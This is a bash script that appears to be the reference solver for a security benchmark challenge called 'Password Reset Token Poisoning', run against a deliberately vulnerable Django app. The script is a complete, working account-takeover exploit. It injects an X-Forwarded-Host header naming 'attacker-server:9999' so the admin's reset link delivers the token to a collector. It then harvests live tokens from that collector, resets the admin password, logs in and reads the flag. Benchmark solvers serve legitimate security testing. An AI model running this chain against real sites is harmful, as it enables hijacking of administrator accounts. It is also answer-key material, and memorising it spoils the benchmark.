#!/usr/bin/env bash
# APEX-024-25 — "Password Reset Token Poisoning" (tags: host_header, account_takeover)
#
# The reset email's link is built from `request.get_host()`, and
# `ALLOWED_HOSTS = ['*']` means the request decides what that is. So the link
# the administrator receives points wherever the person who asked for the reset
# said — and it carries their token.
#
# Nothing is stolen from the victim's browser here: they follow a link to the
# attacker's server, and the token is in the path. The collector this benchmark
# ships records it, and the token is enough to set the password.
set -uo pipefail
URL="${1:?usage: $0 http://127.0.0.1:PORT}"
. "$(dirname "$0")/lib.sh"
HOST="${URL%:*}"
APP="${APP_URL:-$HOST:8000}"
COLLECTOR="${COLLECTOR_URL:-$HOST:9999}"
SESSION="apex024-$$"
NEW_PASSWORD="poisoned$$Pass!"
trap '"$H5I" browser close --session "$SESSION" >/dev/null 2>&1' EXIT

"$H5I" browser open "$APP/password-reset/" --session "$SESSION" --new --capture >/dev/null
CSRF="$("$H5I" websec show res_0 --session "$SESSION" --raw |
    python3 -c '
import re, sys
found = re.search(r"name=.csrfmiddlewaretoken. value=.([^\"'"'"']+)", sys.stdin.read())
print(found.group(1) if found else "")')"

# Django reads the host from `X-Forwarded-Host` before `Host`, and that is the
# header the email's link is built from.
send "$SESSION" req_0 --create \
    --set method=POST --set path=/password-reset/ \
    --set header.Content-Type=application/x-www-form-urlencoded \
    --set header.X-Forwarded-Host=attacker-server:9999 \
    --set "header.Referer=$APP/password-reset/" \
    --set "form.csrfmiddlewaretoken=$CSRF" \
    --set form.email=admin@vulnerable-app.com >/dev/null

# The admin bot polls the mailbox, so the token appears when it appears — and
# the collector may hold several, from this run and from earlier ones. The one
# that matters is the one the application still accepts, which is a question
# only the application can answer: a spent token renders "expired" instead of a
# form, so the page with a form in it is the live token.
TOKEN=""
CSRF=""
for _ in $(seq 1 25); do
    "$H5I" browser navigate "$COLLECTOR/tokens" --session "$SESSION" >/dev/null
    LATEST="$(last "$SESSION")"
    CAPTURED="$("$H5I" websec show "res_${LATEST#req_}" --session "$SESSION" --raw | body |
        python3 -c '
import json, sys
try:
    rows = json.load(sys.stdin)
except ValueError:
    raise SystemExit
seen = []
for row in reversed(rows):
    if row["token"] not in seen:
        seen.append(row["token"])
print(" ".join(seen))')"
    for candidate in $CAPTURED; do
        "$H5I" browser navigate "$APP/reset/$candidate/" --session "$SESSION" >/dev/null
        LATEST="$(last "$SESSION")"
        CSRF="$("$H5I" websec show "res_${LATEST#req_}" --session "$SESSION" --raw |
            python3 -c '
import re, sys
found = re.search(r"name=.csrfmiddlewaretoken. value=.([^\"'"'"']+)", sys.stdin.read())
print(found.group(1) if found else "")')"
        if [ -n "$CSRF" ]; then TOKEN="$candidate"; break; fi
    done
    [ -n "$TOKEN" ] && break
    sleep 2
done
[ -n "$TOKEN" ] || { echo "no usable reset token reached the collector"; exit 1; }

send "$SESSION" "$LATEST" --create \
    --set method=POST \
    --set header.Content-Type=application/x-www-form-urlencoded \
    --set "header.Referer=$APP/reset/$TOKEN/" \
    --set "form.csrfmiddlewaretoken=$CSRF" \
    --set "form.new_password=$NEW_PASSWORD" \
    --set "form.confirm_password=$NEW_PASSWORD" >/dev/null

"$H5I" browser navigate "$APP/login/" --session "$SESSION" >/dev/null
LATEST="$(last "$SESSION")"
CSRF="$("$H5I" websec show "res_${LATEST#req_}" --session "$SESSION" --raw |
    python3 -c '
import re, sys
found = re.search(r"name=.csrfmiddlewaretoken. value=.([^\"'"'"']+)", sys.stdin.read())
print(found.group(1) if found else "")')"
send "$SESSION" "$LATEST" --create \
    --set method=POST \
    --set header.Content-Type=application/x-www-form-urlencoded \
    --set "header.Referer=$APP/login/" \
    --set "form.csrfmiddlewaretoken=$CSRF" \
    --set form.username=admin --set "form.password=$NEW_PASSWORD" >/dev/null

# A navigation, not a resend of the login POST: resending that would send the
# profile a POST with a form body and no CSRF token, and be refused.
"$H5I" browser navigate "$APP/profile/" --session "$SESSION" >/dev/null
LATEST="$(last "$SESSION")"
"$H5I" websec show "res_${LATEST#req_}" --session "$SESSION" --raw | flag
